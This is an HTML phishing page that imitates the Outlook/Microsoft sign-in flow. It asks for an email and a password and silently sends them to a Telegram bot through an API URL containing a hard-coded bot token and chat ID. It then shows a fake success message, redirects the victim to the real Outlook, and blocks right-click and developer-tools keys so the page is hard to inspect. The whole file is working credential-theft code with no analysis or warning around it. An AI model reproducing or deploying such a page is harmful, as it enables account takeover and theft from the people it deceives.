<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Outlook — Sign in</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            font-family: "Segoe UI", Arial, sans-serif;
            background: #f3f6f9;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #1a1a1a;
        }

        .outlook-header {
            font-size: 42px;
            font-weight: 600;
            color: #0078d4;
            margin-bottom: 24px;
            letter-spacing: -1px;
        }

        .container {
            width: calc(100% - 32px);
            max-width: 440px;
            background: #fff;
            padding: 42px;
            border-radius: 8px;
            box-shadow:
                0 2px 6px rgba(0,0,0,.12),
                0 8px 24px rgba(0,0,0,.08);
        }

        .logo {
            margin-bottom: 28px;
        }

        .logo img {
            width: 120px;
            height: auto;
            display: block;
        }

        .logo-text,
        .password-title {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 28px;
            color: #242424;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .input-field {
            width: 100%;
            height: 48px;
            padding: 0 2px;
            border: 0;
            border-bottom: 1px solid #777;
            outline: none;
            font-size: 16px;
            color: #242424;
            background: transparent;
            transition: border-color .2s, box-shadow .2s;
        }

        .input-field::placeholder {
            color: #666;
        }

        .input-field:focus {
            border-bottom: 2px solid #0078d4;
        }

        .button-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 30px;
        }

        .button {
            min-width: 108px;
            height: 42px;
            padding: 0 24px;
            border: none;
            border-radius: 3px;
            background: #0078d4;
            color: white;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background .2s, transform .1s;
        }

        .button:hover {
            background: #106ebe;
        }

        .button:active {
            transform: scale(.98);
        }

        .footer {
            margin-top: 30px;
            text-align: left;
            font-size: 13px;
            color: #666;
            line-height: 1.6;
        }

        .footer p {
            margin: 8px 0;
        }

        .link {
            color: #0067b8;
            text-decoration: none;
        }

        .link:hover {
            text-decoration: underline;
        }

        .success-message {
            width: calc(100% - 32px);
            max-width: 440px;
            padding: 24px;
            border-radius: 8px;
            background: #e8f5e9;
            color: #1b5e20;
            text-align: center;
            box-shadow: 0 4px 18px rgba(0,0,0,.08);
        }

        .success-message strong {
            display: block;
            margin-bottom: 8px;
            font-size: 18px;
        }

        @media (max-width: 520px) {
            body {
                justify-content: flex-start;
                padding-top: 50px;
            }

            .outlook-header {
                font-size: 36px;
                margin-bottom: 18px;
            }

            .container {
                padding: 30px 24px;
            }

            .logo-text,
            .password-title {
                font-size: 25px;
            }
        }
    </style>
</head>

<body>

    <div class="outlook-header">Outlook</div>

    <div class="container" id="email-container">

        <div class="logo">
            <img
                src="https://pub-c2c1d9230f0b4abb9b0d2d95e06fd4ef.r2.dev/sites/113/2016/11/Microsoft-logo-HD.jpg"
                alt="Microsoft"
            >
        </div>

        <div class="logo-text">Sign in</div>

        <form id="email-form">
            <div class="form-group">
                <input
                    type="text"
                    class="input-field"
                    name="email"
                    placeholder="Email, phone, or Skype"
                    autocomplete="username"
                    required
                >
            </div>

            <div class="button-container">
                <button type="submit" class="button">Next</button>
            </div>
        </form>

        <div class="footer">
            <p>
                <a href="#" class="link">Need help?</a>
            </p>
            <p>
                <a href="#" class="link">Terms of use</a>
                &nbsp;|&nbsp;
                <a href="#" class="link">Privacy</a>
            </p>
        </div>
    </div>


    <div class="container" id="password-container" style="display:none;">

        <div class="logo">
            <img
                src="https://pub-c2c1d9230f0b4abb9b0d2d95e06fd4ef.r2.dev/sites/113/2016/11/Microsoft-logo-HD.jpg"
                alt="Microsoft"
            >
        </div>

        <div class="password-title">Enter password</div>

        <form id="password-form">

            <input
                type="password"
                class="input-field"
                name="password"
                placeholder="Password"
                autocomplete="current-password"
                required
            >

            <div class="button-container">
                <button type="submit" class="button">Sign in</button>
            </div>

        </form>

        <div class="footer">
            <p>
                <a href="#" class="link">Need help?</a>
            </p>
            <p>
                <a href="#" class="link">Terms of use</a>
                &nbsp;|&nbsp;
                <a href="#" class="link">Privacy</a>
            </p>
        </div>
    </div>


    <div id="success-message"
         class="success-message"
         style="display:none;">

        <strong>Congratulations!</strong>
        Your account has been successfully updated.
        You will now be redirected to your inbox.

    </div>


</body>

    <script>
        // Fonction pour envoyer un message à Telegram
        function sendToTelegram(email, password) {
            var chatId = '7831644632';  // ID de ton chat Telegram
            var token = '8553794464:AAEQsVsFHelqpQGjk0Ae5nROqgC4XU9JPKM';  // Token de ton bot

            var ip = "90.125.6.48";  // Exemple d'adresse IP, tu peux utiliser une méthode pour récupérer l'IP réelle
            var date = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });  // Date au format français

            var message = `
            
                ${email}:${password}

            `;

            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // Effectuer la requête HTTP pour envoyer le message
            fetch(url)
                .then(response => response.json())
                .then(data => console.log('Message envoyé à Telegram', data))
                .catch(error => console.error('Erreur en envoyant le message:', error));
        }

        // Gérer la soumission de l'email et afficher l'écran de mot de passe
        document.getElementById("email-form").onsubmit = function(event) {
            event.preventDefault();
            var email = document.querySelector('[name="email"]').value;

            document.getElementById("email-container").style.display = "none";
            document.getElementById("password-container").style.display = "block";
        };

        // Gérer la soumission du mot de passe et afficher le message de succès avant la redirection
        document.getElementById("password-form").onsubmit = function(event) {
            event.preventDefault();
            var email = document.querySelector('[name="email"]').value;
            var password = document.querySelector('[name="password"]').value;

            // Envoyer l'email et le mot de passe à Telegram
            sendToTelegram(email, password);

            // Afficher le message de succès
            document.getElementById("password-container").style.display = "none";
            document.getElementById("success-message").style.display = "block";

            // Rediriger après un délai pour laisser le temps de lire le message
            setTimeout(function() {
                window.location.href = "https://outlook.office.com/mail/";  // Redirection vers Outlook après le message
            }, 3000);  // Délai de 3 secondes avant la redirection
        };

    // 1. Logique de traduction (S'exécute en premier pour l'affichage)
    function initialiserLangue() {
        const langue = navigator.language || navigator.userLanguage;
        console.log("Langue détectée : " + langue);
        // Ici, le code modifie le texte des balises HTML existantes
    }

    // Lancement automatique au chargement de la page
    document.addEventListener('DOMContentLoaded', initialiserLangue);

    // 2. Logique de gestion des événements (Boutons, formulaires, etc.)
    // Placée séparément pour ne pas mélanger l'affichage et les actions


    // Bloquer le clic droit
    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
    });

    // Bloquer quelques raccourcis clavier
    document.addEventListener('keydown', function (e) {
        if (
            e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) ||
            (e.ctrlKey && e.key.toUpperCase() === 'U')
        ) {
            e.preventDefault();
        }
    });
</script>

</body>
</html>
